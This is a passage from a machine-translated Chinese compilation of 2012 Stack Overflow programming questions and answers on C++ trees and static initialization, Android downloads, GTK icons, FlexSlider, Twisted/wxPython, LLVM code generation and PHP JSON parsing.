        echo WARNING
        goto end
    ) else (    
       copy c:\temp\ASNReport.txt u:\temp   
       echo copied ASNReport.txt
    )                       
)
:end 
```

# c++ - 无法从类访问节点数据

> ID：13353512
> 
> 赞同：0
> 
> 时间：2012-11-12T23:47:03.280
> 
> 标签：c++, class

我正在制作一个代表 LCRS 树的类，但我的搜索功能遇到了困难。这是我到目前为止所得到的：

lcrs.h：

```
 using namespace std;
    #include <cstdlib>
    #include <iostream>

    class node{
            public:
            int data;
            node *right;
            node *below;
    };

    class lcrs{
            public:
            int height;
            node *root;
            bool search(int);
            void print(lcrs);
            void insert(int);
            void del(int);

            lcrs()
             {
                    root = NULL;
            }
    }; 
```

这是 lcrs.cpp：

```
using namespace std;
#include "lcrs.h"

bool lcrs::search(int x)
{
        if(root == NULL)
                return false;
        else
        {
                if(root->data == x)
                        return true;
                else
                {
                while(right != NULL && below != NULL)
                {
                        if(right->data == x || below->data == x)
                                return true;
                }
                return false;
                }
        }
} 
```

这是我的错误信息：

```
 lcrs.cpp: In member function â€˜bool lcrs::search(int)â€™:
    lcrs.cpp:21:26: error: â€˜belowâ€™ was not declared in this scope
    lcrs.cpp:23:15: error: request for member â€˜dataâ€™ in â€˜std::rightâ€™, which is of non-class type â€˜std::ios_base&(std::ios_base&)â€™ 
```

我知道如果不先创建对象，我无法访问“右”和“下”的成员，但我还有其他方法可以访问它们吗？我只是想看看“数据”中有什么。如果不先实例化一个节点，我看不到如何做到这一点。

非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:54:14.690

你想用递归来做到这一点吗？您需要将当前节点作为函数参数。

这是你想要做的（在伪代码中）？

```
search(int x, node* current)
    if node == NULL return false
    else
    if node->data == x return true
    else
        return search(x, node->right) || search(x, node->below); 
```

编辑：您可以通过以`search(x, root)`.

# android - Android 应用程序中的并发下载（在活动中）

> ID：13353514
> 
> 赞同：1
> 
> 时间：2012-11-12T23:47:11.070
> 
> 标签：android

我是一名新的 Android 开发人员，我正在尝试在我的应用程序中执行以下操作。

给定一个 URL，我想获取该 URL 的 html，解析 HTML 源中的图像并同时下载它们（可能是 2-3 个并行线程）。我正在我的活动中的异步任务中进行实际的 HTML/URL 下载。之后，我解析 HTML 并获得图像 url 列表。此时，让多个线程循环遍历这些图像 url 并下载它们的最佳方法是什么？请提出建议或提供示例。我尝试寻找具有多个线程的阻塞队列以及“Looper”，但仍然对如何实现这一点感到困惑。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:53:07.847

您可能会使用[AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)，但避免使用 Java 线程，因为 Android 操作系统可能会在您的应用程序没有当前可见的 Activity 时立即终止它们。还要避免一次启动多个任务，因为这通常不会使下载过程更快。而是将您的网址放在某种任务队列中

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T00:18:15.903

看看这个，这是您问题的最佳实践并遵循它，这对您来说将是一个很好的最佳实践

[http://android-developers.blogspot.in/2009/05/painless-threading.html](http://android-developers.blogspot.in/2009/05/painless-threading.html)

[如何在自己的线程中执行 Web 请求？](https://stackoverflow.com/questions/2022170/how-to-execute-web-request-in-its-own-thread)

[在 Android 中发出异步 HTTP 请求是否有公认的最佳实践？](https://stackoverflow.com/questions/828280/is-there-an-accepted-best-practice-on-making-asynchronous-http-requests-in-andro)

# gtk - 获取股票 ID 的图标名称？

> ID：13353516
> 
> 赞同：16
> 
> 时间：2012-11-12T23:47:13.917
> 
> 标签：gtk

### 问题

我正在尝试检索与给定（字符串）Gtk 股票 ID 对应的（字符串）图标名称。

### 例子

Gtk stock id 'gtk-go-forward' 有*两个*对应的图标名称，'gtk-go-forward-ltr' 和 'gtk-go-forward-rtl'。我想检索：

*   给定 ID 'gtk-go-forward' 的图标名称 'gtk-go-forward-ltr' 和 'gtk-go-forward-rtl'；**或者**
*   只是图标名称“gtk-go-forward-ltr”（我的文本方向的“适当”名称）。

### 潜在限制

我使用的是 gobject 内省 API，而不是基本的 C API。

### 基本原理（可选阅读）

我正在尝试为[`St.Icon`](http://developer.gnome.org/st/stable/StIcon.html)股票 ID 指定的图标制作一个，但尺寸较大（96 像素）。

我可以[`gtk_icon_set_render_icon`](http://developer.gnome.org/gtk/stable/gtk-Themeable-Stock-Images.html#gtk-icon-set-render-icon)像这样直接使用股票 ID 'gtk-go-forward'（它选择 LTR 版本）（语法是 GNOME javscript，但这与问题无关；我使用的是 GObject 内省 API）：

```
let style = Gtk.Widget.get_default_style();
let iconset = style.lookup_icon_set('gtk-go-forward');
let icon = new St.Icon({
    gicon: iconset.render_icon(gtkStyle, Gtk.TextDirection.LTR,
                               Gtk.StateType.NORMAL, Gtk.IconSize.DIALOG,
                               null, null),
    icon_type: St.IconType.FULLCOLOR,
    icon_size: 96
}); 
```

这会给我一个股票 ID 'gtk-go-forward' 的图标（它选择'gtk-go-forward-ltr'），**但**图标非常模糊。

**或者**，如果我直接输入图标名称“gtk-go-forward-ltr”，则图标*不会*模糊：

```
let icon = new St.Icon({
    gicon: Gio.ThemedIcon.new_with_default_fallbacks('gtk-go-forward-ltr'),
    icon_type: St.IconType.FULLCOLOR,
    icon_size: 96
}); 
```

所以总而言之，我认为获得一个大的、非模糊图标的最佳选择是找到股票 ID 的图标名称，而不是使用股票 ID（提供`gtk-go-forward`给上面的第二种方法会产生“缺少图标”图标因为它不是有效的图标名称）。

![使用股票 ID 的图标（顶部）； 使用图标名称（底部）](../Images/e84dabdd4fa2d8f71f8a1a5c0cef6b61.png)

在上图中，顶部图标使用第一种方法（带有render_icon 的股票ID），底部图标使用第二种方法（直接使用图标名称）。清晰度差别很大。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-10-04T05:30:00.437

## 一般股票图标名称

这个问题现在有点老了，但供将来参考：最好使用`"go-next"`而不是`"gtk-go-forward"`- 这是根据[Icon Naming Spec](http://standards.freedesktop.org/icon-naming-spec/icon-naming-spec-latest.html#names)的正确名称，并且推荐，因为 GTK 开发人员计划[很快弃用股票图标](https://docs.google.com/document/d/1KCVPoYQBqMbDP11tHPpjW6uaEHrvLUmcDPqKAppCY8o/pub)。

直接回答标题中所述的问题：这是一个[方便的 Google Docs 电子表格](https://docs.google.com/spreadsheet/pub?key=0AsPAM3pPwxagdGF4THNMMUpjUW5xMXZfdUNzMXhEa2c&output=html)，为 GTK 股票图标提供了等效的图标规范名称。

## 非模糊、大版本的 GTK 图标

至于获取默认图标的非模糊版本，我发现在 GTK 中以 96px 呈现图标的最佳方法是将其加载到 a`GdkPixbuf`中，然后使用它而不是 a `GtkIcon`（限制为 48px，即最大`GtkIconSize`的，正如 j__m 指出的那样）。如何在 Vala 中执行此操作的示例（轻松转换为 JS 或 Python 等）：

```
var icon_theme = Gtk.IconTheme.get_default();
try {
    var pixbuf = icon_theme.load_icon("go-next", 96, Gtk.IconLookupFlags.USE_BUILTIN);
    // Do something with the pixbuf, for example use it with a CellRendererPixbuf,
    // or a GtkButton or whatever
catch (GLib.Error e) {
    GLib.critical("Could not load icon: %s", e.message);
} 
```

您可能还想尝试`Gtk.IconLookupFlags.FORCE_SIZE`和/或`FORCE_SVG`，特别是如果您想要非常大的图标。

恐怕我从来没有使用过 Shell Toolkit，所以我不知道您是否特别需要`St.Icon`，但在普通 GTK 中，您`GdkPixbuf`几乎可以在任何可以使用股票图标的地方使用 a ，所以这是一种解决方法发现非常有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-02T21:59:01.817

`GTK_ICON_SIZE_DIALOG`（`Gtk.IconSize.DIALOG`在 Javascript 中）小于 96px。您正在渲染一个小图标，然后将其炸毁；自然会看起来很糟糕。

我记得，该值`-1`返回图标的原始大小。然后你可以使用 St.Icon 来设置你想要绘制它的大小，因为这似乎是你想要使用它的方式。

# c++ - 将元素插入全局映射时访问冲突

> ID：13353519
> 
> 赞同：2
> 
> 时间：2012-11-12T23:47:28.817
> 
> 标签：c++, map

我一直在尝试调试这个几个小时，但没有运气。我知道你们会在几分钟内解决问题，所以情况如下：

我有大约 400 个 .cpp/.h 文件，称为 ProblemX.cpp/ProblemX.h（其中 X 是从 1 到 400 的数字）。每个文件都包含数学相关问题的解决方案。我想让问题在编译时将它们自己注册到具有唯一键的全局映射中（只需一个 int 就可以了），并将值作为指向启动数学问题解决方案的函数的指针。

全局映射在名为 Problem.h/Problem.cpp 的文件中创建和处理。但是，当第一个问题尝试在地图中自我注册时，我收到“访问冲突读取位置 0x00000004”。代码如下：

在 ProblemX.h 文件中（problem1 启动了此问题的解决方案）：

```
#ifndef PROBLEM1_H
#define PROBLEM1_H

#include "Problems.h"
#include <string>

std::string problem1();
static int rc1 = registerProblem(1, problem1);

#endif 
```

在 Problems.h 文件中（problemFinder 是使用全局映射调用相应函数指针的函数）：

```
#ifndef PROBLEMS_H
#define PROBLEMS_H

#include <string>

int registerProblem(int problemNum, std::string (*problemFunc)(void));
std::string problemFinder(int problemNum);

#endif 
```

在 Problems.cpp 中：

```
#include "Problems.h"
#include <iostream>
#include <map>

using namespace std;

map<int,std::string (*)(void)> problems_map;

int registerProblem(int problemNum, string (*problemFunc)(void)) {
    int rc = 0;
    problems_map[problemNum] = problemFunc;
    return rc;
}

string problemFinder(int problemNum) {
    string retStr = "";
    retStr = problems_map[problemNum]();
    return retStr;
} 
```

访问冲突发生在“problems_map[problemNum] = problemFunc;”的位置。

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T00:19:36.797

正如神秘命名的 user93353 所回答的那样，`problems_map`不能保证在其他文件中的全局变量之前构造全局变量。

为了避免静态初始化顺序失败，请创建`problems_map`一个*本地*静态，它将在首次使用时被初始化：

```
map<int,std::string (*)(void)>&
get_problems_map()
{
  static map<int,std::string (*)(void)> problems_map;
  return problems_map;
} 
```

然后像这样使用它：

```
get_problems_map()[problemNum] = problemFunc; 
```

这样可以确保在需要时立即创建地图，而不仅仅是在`Problems.cpp`get 的全局构造函数运行时，这可能是（在你的情况下肯定是）在全局`rc1`变量初始化之后。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T23:59:26.057

**小心使用这样的静力学。** 它们的定义顺序可能会有所不同。变量可能存在，但不一定是构造的。这实际上是昨天咬我的屁股，所以它在我的记忆中很新鲜。

在`Problems.cpp`中，事物定义的顺序是：

```
static int rc1 = registerProblem(1, problem1);
map<int,std::string (*)(void)> problems_map; 
```

这意味着`rc1`在之前初始化`problems_map`。

因此，您的问题出现是因为`registerProblem`被调用初始化`rc1`并且它使用`problems_map`尚未构建的。

我一直认为编译器会解决这个问题。但是当您考虑它时，一般情况很难考虑（特别是如果您最终会相互依赖）。所以我想唯一明智的做法是期望程序员以正确的顺序放置他们的静态定义，就像他们应该对任何其他代码语句做的那样。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T00:04:42.727

检查 C++ FAQ on [Constructors](http://www.parashift.com/c++-faq/ctors.html)。特别是检查问题 10.14 到 10.18 - “静态初始化顺序惨败”。

> 什么是“静态初始化订单惨败”？
> 
> 一种使程序崩溃的微妙方法。
> 
> 静态初始化顺序惨败是 C++ 的一个非常微妙且经常被误解的方面。不幸的是，它很难检测到——错误通常发生在 main() 开始之前。
> 
> 简而言之，假设您有两个静态对象 x 和 y，它们存在于单独的源文件中，例如 x.cpp 和 y.cpp。进一步假设 y 对象的初始化（通常是 y 对象的构造函数）调用 x 对象上的某个方法。
> 
> 就是这样。就是这么简单。

# javascript - 事件未触发（或正确形成）后的 FlexSlider

> ID：13353520
> 
> 赞同：2
> 
> 时间：2012-11-12T23:47:37.883
> 
> 标签：javascript, jquery, fadein, flexslider

我正在使用 Flexslider 为一系列滚动幻灯片制作动画。它在里面并且工作得很好。我现在想做的是利用'after：'回调来淡入幻灯片中的标题。就运行顺序而言，它看起来像这样：

1.  幻灯片（包含背景图像）淡入。
2.  暂停（1 秒）。
3.  标题淡入。

我在 'after:' 事件旁边使用了以下功能，你不知道吗，它不起作用。标题已设置为显示：无；但从不显示（是的，我的时机很好）。

```
after: function(){$('.headline').fadeIn(500);}, 
```

HTML：

```
<li>
    <div class="slide">
            <div class="headline">Headline text goes here</div>
    </div>
</li> 
```

指导将不胜感激。

谢谢，@rrfive

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-14T18:15:52.907

您在函数调用中错过了“滑块”对象：

```
after: function(slider){
//do your stuff here
} 
```

还需要通过这种方式指定要淡入的 .headline 元素：

```
after: function(slider){
 curSlide = slider.slides[slider.currentSlide];
 $(curSlide).find('.headline').fadeIn(500);
} 
```

检查woothemes 家伙提供的文档，您会找到所需的一切。如果有问题在这里回复。此致

# python - 不干净存在于twisted+wxPython

> ID：13353521
> 
> 赞同：2
> 
> 时间：2012-11-12T23:48:02.097
> 
> 标签：python, wxpython, twisted, twistd

我正在使用`twistd`. 这是应用程序中唯一的服务：

```
class GameClientService(internet.TCPClient):
    def __init__(self, serverHost, serverPort):
        self.wxApp = wx.App(False)
        reactor.registerWxApp(self.wxApp)
        self.lobbyFrame = gui.LobbyFrame()

        internet.TCPClient.__init__(self, serverHost, serverPort, LobbyProtocolFactory(self.lobbyFrame))

    def stopService(self):
        internet.TCPClient.stopService(self)
        print "Stop service!"
        destroyedD = defer.Deferred()
        self.lobbyFrame.CloseWithCallback(destroyedD.callback, True)
        print "close called!"
        def fired(result):
            print "'Destroyed' deferred has fired with %s" % (result,)
        destroyedD.addCallback(fired)
        return destroyedD 
```

`CloseWithCallback`定义`wx.Frame`如下：

```
def CloseWithCallback(self, callback, *callbackArgs):
    def destroyed(event):
        event.Skip()
        callback(*callbackArgs)
    self.Bind(wx.EVT_WINDOW_DESTROY, destroyed)
    self.Close() 
```

在`LobbyProtocol`的工厂中，如果连接失败，我会停止反应器：

```
def clientConnectionFailed(self, connector, reason):
    print "Client connection failed: %s" % reason.getErrorMessage()
    reactor.stop() 
```

我在没有监听服务器的情况下运行客户端，因此连接失败，但有时（可能超过一半，但并非总是如此）：

```
2012-11-12 18:43:29-0500 [-] Started connecting <twisted.internet.tcp.Connector instance at 0x030E3800>
2012-11-12 18:43:30-0500 [Uninitialized] Client connection failed: Connection was refused by other side: 10061: No connection could be made because the target machine actively refused it..
2012-11-12 18:43:30-0500 [Uninitialized] Stopping factory <network.LobbyProtocol.LobbyProtocolFactory instance at 0x030E3698>
2012-11-12 18:43:30-0500 [-] Stop service!
2012-11-12 18:43:30-0500 [-] 'Destroyed' deferred has fired with True
2012-11-12 18:43:30-0500 [-] Traceback (most recent call last):
2012-11-12 18:43:30-0500 [-]   File "C:\Python26\lib\site-packages\wx-2.8-msw-unicode\wx\_core.py", line 14669, in <lambda>
2012-11-12 18:43:30-0500 [-]     lambda event: event.callable(*event.args, **event.kw) )
2012-11-12 18:43:30-0500 [-]   File "C:\Python26\lib\site-packages\twisted\internet\_threadedselect.py", line 232, in _interleave
2012-11-12 18:43:30-0500 [-]     msg, args = self.toMainThread.get_nowait()
2012-11-12 18:43:30-0500 [-]   File "C:\Python26\lib\Queue.py", line 190, in get_nowait
2012-11-12 18:43:30-0500 [-]     return self.get(False)
2012-11-12 18:43:30-0500 [-]   File "C:\Python26\lib\Queue.py", line 165, in get
2012-11-12 18:43:30-0500 [-]     raise Empty
2012-11-12 18:43:30-0500 [-] Queue.Empty
2012-11-12 18:43:30-0500 [-] Server Shut Down.
2012-11-12 18:43:30-0500 [-] Server Shut Down. 
```

这让我很不舒服。如何确保回溯永远不会运行？我做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:57:48.393

我已经进行了适当的清洗，因此我的代码现在被净化了：

```
class CleanExitApp(wx.App):
    def __init__(self, *args, **kwargs):
        wx.App.__init__(self, *args, **kwargs)

        self.exitDeferreds = []

    def AddExitDeferred(self, exitDeferred):
        self.exitDeferreds.append(exitDeferred)

    def OnExit(self):
        print "OnExit"
        for exitDeferred in self.exitDeferreds:
            exitDeferred.callback(True)

class GameClientService(internet.TCPClient):
    def __init__(self, serverHost, serverPort):
        self.wxApp = CleanExitApp(False)
        reactor.registerWxApp(self.wxApp)
        self.lobbyFrame = gui.LobbyFrame() 

        internet.TCPClient.__init__(self, serverHost, serverPort, LobbyProtocolFactory(self.lobbyFrame))

    def stopService(self):
        internet.TCPClient.stopService(self)
        print "Stop service!"
        exitD = defer.Deferred()
        self.wxApp.AddExitDeferred(exitD)
        self.lobbyFrame.Close()
        print "close called!"
        def fired(result):
            print "'Destroyed' deferred has fired with %s" % (result,)
        exitD.addCallback(fired)
        return exitD 
```

输出使我们感到高兴：

```
2012-11-12 18:56:15-0500 [-] Started connecting <twisted.internet.tcp.Connector instance at 0x032AB8C8>
2012-11-12 18:56:16-0500 [Uninitialized] Client connection failed: Connection was refused by other side: 10061: No connection could be made because the target machine actively refused it..
2012-11-12 18:56:16-0500 [Uninitialized] Stopping factory <network.LobbyProtocol.LobbyProtocolFactory instance at 0x032AB7B0>
2012-11-12 18:56:16-0500 [-] Stop service!
2012-11-12 18:56:16-0500 [-] close called!
2012-11-12 18:56:16-0500 [-] OnExit
2012-11-12 18:56:16-0500 [-] 'Destroyed' deferred has fired with True
2012-11-12 18:56:16-0500 [-] Server Shut Down.
2012-11-12 18:56:16-0500 [-] Server Shut Down. 
```

赞美主！

人们只是想知道主是否有不同的信息......一个更内置的信息，不需要如此折磨的代码？

# c++ - *值未生成到 LLVM 代码中

> ID：13353522
> 
> 赞同：0
> 
> 时间：2012-11-12T23:48:08.877
> 
> 标签：c++, compiler-construction, llvm

我正在尝试编写一些编译器并使用 LLVM 生成中间代码。不幸的是，LLVM 文档不是很好，甚至有些混乱。

目前我已经实现了词法分析器、语法和 AST。我也在关注互联网上的一些例子。我当前的 AST 的工作方式如下：它具有抽象基类 Tree*，其他树从该类继承（例如，一个用于变量定义，一个用于语句列表，一个用于二进制表达式等）。

我正在尝试实现变量定义，因此对于输入

```
class Test{
   int main() 
   {
     int x;
   } 
} 
```

我希望 LLVM 输出为：

```
; ModuleID = "Test"

define i32 @main() {
entry:
   %x = alloca i32
   return i32 0
} 
```

但是，现在我可以将 %x = alloca i32 部分添加到创建 main 函数的部分，但实际输出缺少 %x = alloca i32。所以，我得到的输出如下：

```
; ModuleID = "Test"

define i32 @main() {
entry:
   return i32 0
} 
```

我的用于变量声明的 Codegen() 如下所示（符号表现在只是一个列表，我目前正努力使事情尽可能简单）：

```
llvm::Value *decafStmtList::Codegen() {

string name = SyandTy.back(); // Just a name of a variable
string type = SyandTy.front(); // and its type in string format
Type* typeVal = getLLVMType(decafType(str2DecafType(type))); // get LLVM::*Type representation
llvm::AllocaInst *Alloca = Builder.CreateAlloca(typeVal, 0, name.c_str());
Value *V = Alloca;
return Alloca;//Builder.CreateLoad(V, name.c_str());
} 
```

我生成@main 的部分如下： 注意：我已经注释掉了 print_int 函数（这是我稍后将用来打印东西的函数，但现在我不需要它）。如果我取消注释 print_int 函数，TheFunction 将不会通过验证器（TheFunction）-> 抱怨模块被破坏并且参数与签名不匹配。

```
Function *gen_main_def(llvm::Value *RetVal, Function *print_int) {
  if (RetVal == 0) {
    throw runtime_error("something went horribly wrong\n");
  }
  // create the top-level definition for main
  FunctionType *FT = FunctionType::get(IntegerType::get(getGlobalContext(), 32), false);
  Function *TheFunction = Function::Create(FT, Function::ExternalLinkage, "main", TheModule);
  if (TheFunction == 0) {
    throw runtime_error("empty function block"); 
  }
  // Create a new basic block which contains a sequence of LLVM instructions
  BasicBlock *BB = BasicBlock::Create(getGlobalContext(), "entry", TheFunction);
  // All subsequent calls to IRBuilder will place instructions in this location
  Builder.SetInsertPoint(BB);

  /*
  Function *CalleeF = TheModule->getFunction(print_int->getName());
  if (CalleeF == 0) {
    throw runtime_error("could not find the function print_int\n");
  }*/
  // print the value of the expression and we are done
 // Value *CallF = Builder.CreateCall(CalleeF, RetVal, "calltmp");

 // Finish off the function.
 // return 0 from main, which is EXIT_SUCCESS
  Builder.CreateRet(ConstantInt::get(getGlobalContext(), APInt(32, 0)));
  return TheFunction;
} 
```

如果有人知道为什么我的 Alloca 对象没有生成，请帮助我 - 任何提示将不胜感激。

谢谢

编辑：

Codegen 从语法中调用：

```
start: program

program: extern_list decafclass
{ 

    ProgramAST *prog = new ProgramAST((decafStmtList *)$1, (ClassAST *)$2); 
    if (printAST) {
        cout << getString(prog) << endl;
    }
     Value *RetVal = prog->Codegen();
     delete $1; // get rid of abstract syntax tree
     delete $2; // get rid of abstract syntax tree

     // we create an implicit print_int function call to print
     // out the value of the expression.

     Function *print_int = gen_print_int_def();
     Function *TheFunction = gen_main_def(RetVal, print_int);
     verifyFunction(*TheFunction);
} 
```

编辑：我想通了，基本上 createAlloca 必须在生成 main 时在 basicblock 之后调用；

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:04:47.343

这里有两个奇怪的地方：

1.  您所做的就是调用 Builder.CreateRet... 我看不出 main 中怎么会有任何代码，除非您调用创建相应指令的东西。特别是，您似乎从未调用过 CodeGen 部分。

2.  您将零大小传递给 CreateAlloc。我认为大小应该是单个变量的大小。

此外，请确保在生成代码后不调用任何 LLVM 优化通道。这些通行证会优化价值（它从未使用过，因此是死代码）。

# php - 用php多次打印和多余的urldecode解析JSON

> ID：13353525
> 
> 赞同：0
> 
> 时间：2012-11-12T23:48:22.593
> 
> 标签：php, json, urlencode

继承我的脚本：[http](http://ggcc.tv/JSON_Parsers/Music/getcities.php) : //ggcc.tv/JSON_Parsers/Music/getcities.php 继承我的 json：[http](http://www.godsgypsychristianchurch.net/music.json) ://www.godsgypsychristianchurch.net/music.json （请同时查看）

**问题** 1\. 它打印出重复，

**问：如何让它为每个城市打印一个链接（见 json & script）**

1.  它在网址中添加了一些多余的文本，网址目前看起来像[http://www.ggcc.tv/JSON_Parsers/Music/getalbums.php?churchname=Cleveland+OH%3E%3Cbr%20/%3ECleveland%20OH% 3C/a%3E%3Ca%20href=](http://www.ggcc.tv/JSON_Parsers/Music/getalbums.php?churchname=Cleveland+OH%3E%3Cbr%20/%3ECleveland%20OH%3C/a%3E%3Ca%20href=)

什么时候应该只是

[http://www.ggcc.tv/JSON_Parsers/Music/getalbums.php?churchname=Cleveland+OH](http://www.ggcc.tv/JSON_Parsers/Music/getalbums.php?churchname=Cleveland+OH)

**问：我该如何解决这个问题？**

*请记住 JSON 对同一个城市有多个对象，我只需要列出每个城市一次（而不是多次）*

我的PHP：

```
$churches = array();
    $count = 1;
    foreach ($json['rows'] as $row) {
        ++$count;

{
    if (!in_array($row[doc]['church'], $churches))
        $churches[] = $row[doc]['church'];
}

foreach ($churches as $church)
{
    print '<a href="getalbums.php?churchname=' . urlencode($church) . '><br />' . htmlentities($church) . '</a>'; }

  } 
    exit; 
```

我的 JSON：

```
{"total_rows":1,"offset":0,"rows":[

              {"id":"All Things Are Possible",
"key":"All Things Are Possible",
"doc":{"_id":"All Things Are Possible",
"album":"All Things Are Possible",
"artwork":"http://godsgypsychristianchurch.net/music_artwork/DEFAULT_COVER2.png",
"baseurl":"http://www.godsgypsychristianchurch.net/music",
"church":"Atlanta GA",
"cityartwork":"http://www.ggcc.tv/LogoNE.png",
"des":"All Things Are Possible from the Atlanta GA Church, Pastor Nick White",
"tracks":[
    {"name":"1 Intro",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/01%20Intro.mp3"},

            {"name":"2 Wo si O Drom",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/02%20Wo%20si%20O%20drom.mp3"},

            {"name":"3 Nas Murrgo Shov",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/03%20Nas%20murrgo%20shov.mp3"},

            {"name":"4 To Cho Vos",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/04%20To%20cho%20vos.mp3"},

            {"name":"5 Tu Son Kai Sastridas",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/05%20Tu%20son%20kai%20sastridas.mp3"},

            {"name":"6 Now I Am Strong",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/06%20Now%20I%20am%20strong.mp3"},

            {"name":"7 Sorr Nevee",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/07%20Zorr%20nevee.mp3"},

            {"name":"8 Preaching",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/08%20Preaching.mp3"},

            {"name":"9 Arkadyan Amey",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/09%20Arkadyan%20amey.mp3"},

            {"name":"10 O Christo Ka Wudarr",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/10%20O%20Christo%20ka%20wudarr.mp3"},

            {"name":"11 Eloi, Eloi",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/11%20Eloi%2C%20Eloi.mp3"},

            {"name":"12 Amadow Dell",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/12%20Amadow%20Dell.mp3"},

            {"name":"13 Sastiar Amey Devla",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/13%20Sastiar%20amey%20Devla.mp3"},

            {"name":"14 Tu Skepeese",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/14%20Tu%20skepeese.mp3"},

            {"name":"15 Dov Ma Godgee",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/15%20Dov%20ma%20godgee.mp3"},

            {"name":"16 The Lord is my strength",
        "url":"/Atlanta%20GA/All%20things%20are%20possible/16%20The%20Lors%20is%20my%20strength.mp3"}
  ]}},

                        {"id":"Can You See Him",
"key":"Can You See Him",
"doc":{"_id":"Can You See Him",
"album":"Can You See Him",
"artwork":"http://godsgypsychristianchurch.net/music_artwork/DEFAULT_COVER2.png",
"baseurl":"http://www.godsgypsychristianchurch.net/music",
"church":"Atlanta GA",
"cityartwork":"http://www.ggcc.tv/LogoNE.png",
"des":"Can You See Him from the Atlanta GA Church, Pastor Nick White",
"tracks":[
    {"name":"1 Aven Luvudes Les",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/01AvenLuvudesLes.mp3"},

            {"name":"2 Aven Onglay",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/02AvenOnglay.mp3"},

            {"name":"3 Chey Bistrov",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/03CheyBistrov.mp3"},

            {"name":"4 Pred Ahmen",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/04PerdAhmen.mp3"},

            {"name":"5 Swento Jeelabas",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/05SwentoJeelabas.mp3"},

            {"name":"6 Pye O Shoovendow",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/06PyeOShoovendo.mp3"},

            {"name":"7 Message",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/07Message.mp3"},

            {"name":"8 Ryah Devla",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/08RyahDevla.mp3"},

            {"name":"9 Hida Bowpahlay",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/09HidaBowpahlay.mp3"},

            {"name":"10 Jeelaben Halleyjah",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/10JeelabenHalleujah.mp3"},

            {"name":"11 Chey Bahro San Devla",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/11CheyBahroSanDevla.mp3"},

            {"name":"12 Woe Sa Kahtey",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/12WoeSaKahtey.mp3"},

            {"name":"13 Noomah Pacha",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/13NoomahPahcha.mp3"},

            {"name":"14 To Worship You I Live",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/14ToWorshipYouILive.mp3"},

            {"name":"15 Regev Mon Devla",
        "url":"/Atlanta%20GA/Can%20You%20See%20Him/15RegevMonDevla.mp3"}

  ]}},

                {"id":"Dey Duma Amensa",
"key":"Dey Duma Amensa",
"doc":{"_id":"Dey Duma Amensa",
"album":"Dey Duma Amensa",
"artwork":"http://godsgypsychristianchurch.net/music_artwork/DEFAULT_COVER2.png",
"baseurl":"http://www.godsgypsychristianchurch.net/music",
"church":"Atlanta GA",
"cityartwork":"http://www.ggcc.tv/LogoNE.png",
"des":"Dey Duma Amensa from the Atlanta GA Church, Pastor Nick White",
"tracks":[
    {"name":"1 Greeting",
        "url":"/Atlanta%20GA/Dey%20duma%20amensa/01%20Greeting.mp3"},

            {"name":"2 Godya Vramya",
        "url":"/Atlanta%20GA/Dey%20duma%20amensa/02%20Godya%20vramya.mp3"},

            {"name":"3 Vosdoa Vos, Geelabos",
        "url":"/Atlanta%20GA/Dey%20duma%20amensa/03%20Vosdoa%20vos%2C%20geelabos.mp3"},

            {"name":"4 Amey Luvudees Tu",
        "url":"/Atlanta%20GA/Dey%20duma%20amensa/04%20Amey%20lubudees%20tu.mp3"},

            {"name":"5 Dey Duma Amensa",
        "url":"/Atlanta%20GA/Dey%20duma%20amensa/05%20Dey%20duma%20amensa.mp3"},

            {"name":"6 Preaching",
        "url":"/Atlanta%20GA/Dey%20duma%20amensa/06%20Preaching.mp3"},

            {"name":"7 I Came to Worship you",
        "url":"/Atlanta%20GA/Dey%20duma%20amensa/07%20I%20came%20to%20worship%20you.mp3"},

            {"name":"8 Kon Komel",
        "url":"/Atlanta%20GA/Dey%20duma%20amensa/08%20Kon%20Komel.mp3"},

            {"name":"9 Hydee Swento Ducho",
        "url":"/Atlanta%20GA/Dey%20duma%20amensa/09%20Hydee%20Swento%20Ducho.mp3"},

            {"name":"10 Mey Luvudeev Tu",
        "url":"/Atlanta%20GA/Dey%20duma%20amensa/10%20Mey%20luvudeev%20tu.mp3"},

            {"name":"11 Dov Murrgo Tryo",
        "url":"/Atlanta%20GA/Dey%20duma%20amensa/11%20Dov%20murrgo%20tryo.mp3"},

                    {"name":"12 Amey Luvudees tu",
